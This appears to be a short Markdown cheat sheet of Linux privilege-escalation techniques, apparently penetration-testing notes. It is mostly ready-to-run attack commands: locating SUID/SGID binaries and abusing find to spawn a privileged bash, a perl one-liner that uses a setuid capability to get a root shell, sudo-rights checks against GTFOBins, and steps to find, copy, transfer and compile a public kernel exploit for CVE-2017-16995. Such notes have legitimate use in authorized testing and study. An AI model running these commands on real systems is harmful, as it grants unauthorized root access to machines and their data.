# Insecure System Components

## setuid binaries

__REQUIRES__

 - Binary with SUID for privileged account
 - https://gtfobins.org/
 
User and group find - inheriting group is generally not as risky
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

Example abuse (find binary)
```bash
find . -exec "/usr/bin/bash" -p \;
```

## Linux capabilities

___REQUIRES___

 - Processes or binaries with specific capabilities enabled on them

Get capabilities
```bash
/usr/sbin/getcap -r / 2>/dev/null
```

Looking for privileges like (setuid cap):
```text
cap_setuid+ep
```

Example exploit
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
```

## Abusing sudo

__REQUIRES__

 - sudo privileges over a dangerous binary

Check sudo privilege
```bash
sudo -l
```

Check GTFOBins (and elsewhere if nothing is on GTFOBins)
```text
https://gtfobins.org/gtfobins/tcpdump/#sudo
```


## Exploiting Kernel Vulnerabilities

__REQUIRES__

 - vulnerable linux kernel

Enumerate system information
```bash
cat /etc/issue
uname -r
arch
```

Sample Searchsploit Command
```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

copy, move, and compile exploit code
```bash
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
mv 45010.c cve-2017-16995.c
scp cve-2017-16995.c joe@192.168.123.216:
gcc cve-2017-16995.c -o cve-2017-16995
```